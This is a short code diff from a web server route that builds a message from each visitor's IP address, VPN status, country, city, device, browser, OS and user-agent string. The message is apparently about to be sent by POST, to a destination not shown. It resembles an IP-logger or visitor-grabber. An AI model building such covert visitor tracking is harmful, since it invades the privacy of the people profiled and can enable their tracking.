@@ -22,7 +22,7 @@ router.get("/", async (ctx) => {
   const device_os = encodeURIComponent(`**SYSTEM** : ${os.name}`);
   const browser_v = encodeURIComponent(`**BROWSER** : ${browser.name}`);
   const userAgentString_v = encodeURIComponent(`**userAgentString** : \`\`\`ts ${userAgentString}\`\`\``);
-  const text = encodeURIComponent(`${iptext}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${vpn}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${countryinfo}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${cityInfo}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${device_v}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${browser_v}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${device_os}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${userAgentString_v}`);
+  const text = `${iptext}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${vpn}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${countryinfo}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${cityInfo}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${device_v}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${browser_v}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${device_os}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${userAgentString_v}`
   const button = {
     method: 'POST',
     headers: {
